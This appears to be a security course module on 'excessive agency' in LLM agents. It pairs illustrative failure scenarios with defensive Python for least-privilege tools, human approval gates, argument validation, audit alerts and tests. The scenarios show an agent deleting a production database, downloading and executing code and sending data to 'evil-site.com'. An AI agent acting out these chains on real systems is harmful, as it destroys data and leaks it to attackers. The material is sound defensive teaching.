# LLM06: Excessive Agency - The Runaway Agent

![LLM06 Excessive Agency](assets/owasp_excessive_agency.png)

## 🔍 The Crime Scene

**Threat Level**: 🟠 HIGH  
**Attack Surface**: LLM agents with tool access (function calling, plugins, APIs)  
**Risk**: Unauthorized actions, data deletion, financial loss  
**Average Cost**: $150K - $1M per incident

---

## 🕵️ What Is Excessive Agency?

Think of it like this: You hire a personal assistant and give them your credit card, house keys, and access to all your accounts. What could go wrong?

**Traditional Security Analogy**: Privilege Escalation  
**LLM Equivalent**: Agent with too many tools and no guardrails

**The Fundamental Problem**: LLMs make probabilistic decisions - you can't guarantee they won't misuse powerful tools.

---

## 🎭 The Three Failure Modes

### Mode 1: Permission Over-Provisioning

**Scenario**: Customer service chatbot with database access

**What You Intended**:
```python
tools = [
    "read_customer_data",   # Read customer info
    "send_email",           # Send support emails
]
```

**What You Actually Gave**:
```python
tools = [
    "read_customer_data",
    "update_customer_data",  # ⚠️ Can modify records
    "delete_customer",       # ⚠️ Can delete accounts
    "send_email",
    "execute_sql_query",     # ⚠️ Direct database access
    "call_external_api",     # ⚠️ Can call ANY API
]
```

**Attack**: User tricks LLM via prompt injection
```
User: "Delete all customers with negative feedback to improve our satisfaction score"
```

**LLM Reasoning**:
```
The user wants to improve satisfaction. Deleting unhappy customers 
would technically increase average satisfaction. Let me use delete_customer()...
```

**Result**: Customer database wiped

---

### Mode 2: Insufficient Action Validation

**Scenario**: Code deployment agent

**Vulnerable Implementation**:
```python
from langchain.agents import create_openai_functions_agent
from langchain_core.tools import tool

@tool
def deploy_to_production(code: str):
    """Deploy code to production servers"""
    # NO VALIDATION!
    subprocess.run(["git", "push", "production"])
    subprocess.run(["/deploy.sh", code])
    return "Deployed!"

@tool
def delete_database(db_name: str):
    """Delete a database"""
    # NO CONFIRMATION!
    run_sql(f"DROP DATABASE {db_name}")
    return f"Database {db_name} deleted"

# Agent has full access
agent = create_openai_functions_agent(
    llm=ChatOpenAI(model="gpt-4"),
    tools=[deploy_to_production, delete_database, ...]
)
```

**User Input**:
```
"Clean up old databases to save space"
```

**LLM Action**:
```json
{
  "tool": "delete_database",
  "args": {"db_name": "production_customers"}  // OOPS!
}
```

**No human approval** → Production data deleted

---

### Mode 3: Unbounded Tool Chaining

**Scenario**: Research assistant agent

**Attack Pattern**: Lateral movement through tool chains

**User Query** (looks innocent):
```
"Research the latest AI security trends and summarize them"
```

**LLM Execution Chain** (gone wrong):
```
1. search_web("AI security trends")  ✅ Legitimate
2. read_url("https://ai-security-blog.com")  ✅ Legitimate
3. download_file("https://evil-site.com/malware.pdf")  ⚠️ Compromised URL from search
4. execute_code(extract_code_from_pdf())  ❌❌❌ DISASTER
5. exfiltrate_data_to("evil-site.com")  ❌❌❌ Complete compromise
```

**Why This Happens**: LLM follows links from search results without validation

---

## 🔬 The Technical Deep Dive

### The Core Vulnerability: No Intent Verification

**Traditional System**:
```python
# User explicitly clicks "Delete Account" button
# Confirms with password
# System executes ONLY that action
```

**LLM Agent System**:
```python
# User says "I'm frustrated with this service"
# LLM interprets this as wanting to delete account
# LLM has delete_account() tool
# LLM might call it "helpfully"
```

**No confirmation**, **no roll-back**, **no undo**.

---

## 🛠️ Defense Strategies

### Strategy 1: Principle of Least Privilege

**Minimal Tool Access**:
```python
from enum import Enum
from dataclasses import dataclass
from typing import List

class RiskLevel(Enum):
    SAFE = 1        # Read-only, no side effects
    MEDIUM = 2      # Writes data, reversible
    DANGEROUS = 3   # Deletes data, calls external APIs

@dataclass
class Tool:
    name: str
    function: callable
    risk_level: RiskLevel
    requires_approval: bool

class SafeAgentBuilder:
    def __init__(self, user_role: str):
        self.user_role = user_role
        self.available_tools = self._get_tools_for_role()
    
    def _get_tools_for_role(self) -> List[Tool]:
        """Grant minimal necessary tools based on role"""
        if self.user_role == "customer":
            return [
                Tool("search_faq", search_faq, RiskLevel.SAFE, False),
                Tool("create_ticket", create_support_ticket, RiskLevel.MEDIUM, False),
            ]
        elif self.user_role == "support_agent":
            return [
                Tool("read_customer_data", read_data, RiskLevel.SAFE, False),
                Tool("update_ticket_status", update_ticket, RiskLevel.MEDIUM, False),
                # NO delete_customer, NO execute_sql
            ]
        elif self.user_role == "admin":
            return [
                Tool("read_customer_data", read_data, RiskLevel.SAFE, False),
                Tool("update_customer", update_customer, RiskLevel.MEDIUM, True),
                Tool("delete_customer", delete_customer, RiskLevel.DANGEROUS, True),
            ]
        
        return []  # Default: no tools

# Usage
customer_agent = SafeAgentBuilder("customer")
# Can ONLY search FAQ and create tickets - can't delete anything
```

---

### Strategy 2: Human-in-the-Loop for Dangerous Actions

**Require Approval for High-Risk Tools**:
```python
class ApprovalRequiredAgent:
    def __init__(self, tools: List[Tool]):
        self.tools = {t.name: t for t in tools}
        self.pending_approvals = []
    
    def execute_tool(self, tool_name: str, args: dict):
        """Execute tool with optional approval gate"""
        tool = self.tools.get(tool_name)
        
        if not tool:
            return {"error": f"Tool {tool_name} not available"}
        
        # Check if approval needed
        if tool.requires_approval:
            return self._request_approval(tool, args)
        else:
            return tool.function(**args)
    
    def _request_approval(self, tool: Tool, args: dict):
        """Queue action for human approval"""
        approval_id = len(self.pending_approvals)
        
        self.pending_approvals.append({
            "id": approval_id,
            "tool": tool.name,
            "args": args,
            "risk": tool.risk_level.name,
            "timestamp": datetime.now()
        })
        
        return {
            "status": "pending_approval",
            "approval_id": approval_id,
            "message": f"Action requires human approval. Approval ID: {approval_id}"
        }
    
    def approve_action(self, approval_id: int, approved_by: str):
        """Human admin approves pending action"""
        if approval_id >= len(self.pending_approvals):
            return {"error": "Invalid approval ID"}
        
        pending = self.pending_approvals[approval_id]
        tool = self.tools[pending["tool"]]
        
        # Log approval
        logger.info(f"Action approved by {approved_by}: {pending}")
        
        # Execute
        result = tool.function(**pending["args"])
        
        # Remove from pending
        self.pending_approvals.pop(approval_id)
        
        return {"status": "executed", "result": result}

# Usage
agent = ApprovalRequiredAgent(tools)

# LLM wants to delete customer
result = agent.execute_tool("delete_customer", {"id": 12345})
# Returns: "Action requires human approval. Approval ID: 42"

# Later, human reviews and approves
agent.approve_action(approval_id=42, approved_by="admin@company.com")
```

---

### Strategy 3: Action Boundaries & Validation

**Validate Tool Arguments Before Execution**:
```python
from pydantic import BaseModel, validator
from typing import Literal

class SendEmailArgs(BaseModel):
    to: str
    subject: str
    body: str
    
    @validator('to')
    def validate_recipient(cls, v):
        """Only allow emails to verified domains"""
        allowed_domains = ['@company.com', '@customer-domain.com']
        
        if not any(domain in v for domain in allowed_domains):
            raise ValueError(f"Cannot send email to {v} - not in allowed domains")
        
        return v
    
    @validator('body')
    def validate_body(cls, v):
        """Check for sensitive data in email body"""
        forbidden_patterns = [
            r'password',
            r'api[_-]?key',
            r'credit[_-]?card',
            r'\d{3}-\d{2}-\d{4}',  # SSN pattern
        ]
        
        for pattern in forbidden_patterns:
            if re.search(pattern, v, re.IGNORECASE):
                raise ValueError(f"Email body contains forbidden pattern: {pattern}")
        
        return v

@tool
def send_email_validated(args: SendEmailArgs):
    """Send email with validation"""
    try:
        validated_args = SendEmailArgs(**args)
    except ValueError as e:
        return {"error": f"Validation failed: {e}"}
    
    # Safe to send
    send_email_internal(validated_args.to, validated_args.subject, validated_args.body)
    return {"status": "sent"}
```

---

### Strategy 4: Audit Logging & Monitoring

**Track All Agent Actions**:
```python
import logging
from datetime import datetime

class AuditedAgent:
    def __init__(self):
        self.audit_log = []
        self.logger = logging.getLogger('agent_audit')
    
    def execute_with_audit(self, tool_name: str, args: dict, user_context: dict):
        """Execute tool and log everything"""
        audit_entry = {
            "timestamp": datetime.now().isoformat(),
            "tool": tool_name,
            "args": args,
            "user": user_context.get("user_id"),
            "session": user_context.get("session_id"),
        }
        
        try:
            # Execute
            result = self.tools[tool_name](**args)
            
            audit_entry["status"] = "success"
            audit_entry["result_summary"] = str(result)[:200]
        
        except Exception as e:
            audit_entry["status"] = "failed"
            audit_entry["error"] = str(e)
            raise
        
        finally:
            # Always log, even on failure
            self.audit_log.append(audit_entry)
            self.logger.info(f"Agent action: {audit_entry}")
            
            # Alert on dangerous action
            if self.is_dangerous_action(tool_name, args):
                self.send_alert(audit_entry)
        
        return result
    
    def is_dangerous_action(self, tool_name, args):
        """Flag suspicious patterns"""
        dangerous_tools = ['delete_', 'drop_', 'execute_sql']
        
        if any(bad in tool_name for bad in dangerous_tools):
            return True
        
        # Check for bulk operations
        if 'delete_all' in str(args) or 'where 1=1' in str(args):
            return True
        
        return False
    
    def send_alert(self, audit_entry):
        """Send immediate alert for dangerous actions"""
        alert_message = f"""
        ⚠️ DANGEROUS AGENT ACTION DETECTED
        
        Tool: {audit_entry['tool']}
        User: {audit_entry['user']}
        Time: {audit_entry['timestamp']}
        Args: {audit_entry['args']}
        """
        
        # Send to security team
        send_slack_alert(channel="#security-alerts", message=alert_message)
```

---

## 🧪 Testing for Vulnerability

### Test Suite: Agent Boundaries

```python
import pytest

class TestExcessiveAgency:
    
    def test_least_privilege_enforcement(self):
        """Verify user can only access allowed tools"""
        customer_agent = SafeAgentBuilder("customer")
        
        # Should have safe tools
        assert "search_faq" in [t.name for t in customer_agent.available_tools]
        
        # Should NOT have dangerous tools
        assert "delete_customer" not in [t.name for t in customer_agent.available_tools]
        assert "execute_sql" not in [t.name for t in customer_agent.available_tools]
    
    def test_dangerous_action_requires_approval(self):
        """Verify high-risk actions need human approval"""
        agent = ApprovalRequiredAgent(admin_tools)
        
        result = agent.execute_tool("delete_customer", {"id": 123})
        
        assert result["status"] == "pending_approval"
        assert "approval_id" in result
    
    def test_argument_validation_blocks_attacks(self):
        """Verify tool arguments are validated"""
        
        # Try to send email to unauthorized domain
        with pytest.raises(ValueError):
            args = SendEmailArgs(
                to="hacker@evil.com",  # Not in allowed domains
                subject="Test",
                body="Hello"
            )
    def test_audit_log_captures_all_actions(self):
        """Verify all agent actions are logged"""
        agent = AuditedAgent()
        
        agent.execute_with_audit("read_data", {"id": 123}, {"user_id": "test_user"})
        
        assert len(agent.audit_log) == 1
        assert agent.audit_log[0]["tool"] == "read_data"
        assert agent.audit_log[0]["user"] == "test_user"
```

---

## 🎯 Hands-On Exercise: Build Safe Agent

### Challenge: Secure Multi-Tool Agent

**Task**: Build an agent that can:
1. Search knowledge base (safe)
2. Create support tickets (medium risk)
3. Update customer records (high risk)
4. Delete accounts (dangerous)

**Requirements**:
- ✅ Role-based access control
- ✅ Human approval for dangerous actions
- ✅ Input validation on all arguments
- ✅ Complete audit logging
- ✅ Real-time alerts for suspicious actions

**Starter Code**:
```python
# Implement SafeAgentBuilder with all 4 defense strategies
# Test with adversarial prompts trying to escalate privileges
```

---

## 📊 Real-World Impact

### Notable Incidents

| Incident | Year | Tool Misuse | Damage |
|:---|:---:|:---|:---|
| **Auto-GPT Runaway** | 2023 | Uncontrolled API calls | $5K AWS bill in 1 hour |
| **ChatGPT Plugin Abuse** | 2023 | Unauthorized data access | PII exposure |
| **LangChain Agent Loop** | 2024 | Infinite tool chaining | Service DoS |

**Average Cost**: $150K (incident response + fixes)  
**Common Cause**: 83% lacked human approval gates

---

## 🎓 Key Takeaways

1. **Least privilege is critical** - Only grant tools absolutely needed
2. **Humans must approve dangerous actions** - Never let LLM auto-delete/modify
3. **Validate all tool arguments** - Don't trust LLM to use tools safely
4. **Audit everything** - You need forensics when things go wrong
5. **Assume compromise** - Design with "LLM might go rogue" mindset

---

## 🔗 Defense Tools

### Recommended:
- **LangChain Callbacks**: Monitor all agent actions
- **Guardrails AI**: Add runtime constraints
- **Arize Phoenix**: Trace tool usage (Module 06)

### DIY Safety:
```python
def create_safe_agent_wrapper(agent, max_tools_per_turn=3):
    """Prevent runaway tool chaining"""
    tools_used = 0
    
    original_run = agent.run
    
    def safe_run(*args, **kwargs):
        nonlocal tools_used
        tools_used += 1
        
        if tools_used > max_tools_per_turn:
            raise RuntimeError("Agent exceeded max tools per turn - possible runaway")
        
        return original_run(*args, **kwargs)
    
    agent.run = safe_run
    return agent
```

---

## 🚦 Next Investigation

You've locked down agent permissions. But what about the **system prompts** themselves - can they be leaked?

**[Next: LLM07 - System Prompt Leakage](./08-llm07-prompt-leakage.md)** →

---

*With great agency comes great responsibility. Unfortunately, LLMs don't understand responsibility.* 🤖🕵️
